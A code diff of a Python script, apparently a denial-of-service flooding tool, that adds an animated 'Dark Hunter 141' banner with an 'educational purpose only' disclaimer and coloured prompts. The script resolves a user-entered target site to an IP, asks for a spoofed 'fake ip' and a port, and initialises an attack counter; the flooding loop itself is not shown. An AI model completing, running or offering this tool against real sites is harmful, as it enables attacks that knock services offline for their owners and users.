@@ -1,19 +1,37 @@
 import socket
 import threading
-import time
+from time import sleep
+import sys
+ 
+ 
 
+
+def animate(text):
+      for letter in text:
+       print(letter, end="")
+       sys.stdout.flush()
+       sleep(0.0000000000000000000001)
+       
+banner = '''
+\033[1;32;40mTeam        : Dark Hunter 141
+Coded By    : Ashrafi Khandaker Abir(DarkXploit)
+              Shariful Islam (DarkWolf)
+Note : Use educational perpose only 
+'''
+print("\033[1;35;40m="*50)
+animate(banner)
+print("\033[1;35;40m="*50)
 def target(url):
     ip = socket.gethostbyname(url) 
     return ip
-url = input("Enter site name without http:// or https://  example : target.com : ")
+url = input("\033[1;32;40mEnter site name without http:// or https://  example : target.com : ")
 target = target(url)
-print (f"Site Name is   {url}:::IP Address is    {target}")
-fake_ip = input("Enter a fake ip or just click enter button for default :") or ('182.21.20.32')
-print(f"Fake IP Is {fake_ip}")
-port = input("Enter port or just click enter for default : ")or  80
-print(f"Port number is {port}")
-
-time.sleep(1)
+print (f"\033[1;33;40mSite Name is   {url}:::IP Address is    {target}")
+fake_ip = input("\033[1;32;40mEnter a fake ip or just click enter button for default :") or ('182.21.20.32')
+print(f"\033[1;33;40mFake IP Is {fake_ip}")
+port = input("\033[1;32;40mEnter port or just click enter for default : ")or  80
+print(f"\033[1;33;40mPort number is {port}")
+sleep(1)
        
 attack_num = 0
 
